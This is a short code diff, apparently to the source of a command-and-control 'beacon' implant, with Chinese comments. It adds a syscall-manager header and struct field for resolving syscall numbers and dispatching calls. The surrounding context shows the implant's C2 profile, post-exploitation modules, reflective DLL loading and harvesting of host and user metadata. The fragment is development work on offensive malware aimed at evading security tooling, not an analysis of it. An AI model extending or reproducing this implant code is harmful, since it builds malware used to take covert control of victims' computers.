@@ -8,6 +8,7 @@
 #include "beacon_tunnel.h"
 #include "beacon_cascade.h"
 #include "beacon_api.h"
+#include "beacon_syscall.h"
 #include "beacon_jobs.h"
 #include "beacon_runtime.h"
 #include "beacon_postex.h"
@@ -15,6 +16,7 @@
 /* Beacon 实例的运行时状态 */
 typedef struct BeaconContext {
     Win32Api api;                  /* 动态解析的 API 函数指针 */
+    SyscallManager syscall;        /* syscall 层：SSN 解析与调用方式分派 */
     Profile profile;               /* C2、sleep、传输等运行配置 */
     PVOID image_base;              /* DLL/EXE 映像基址，sleep/RDI 逻辑会使用 */
     MetaData meta;                 /* 主机、用户、进程等元数据 */
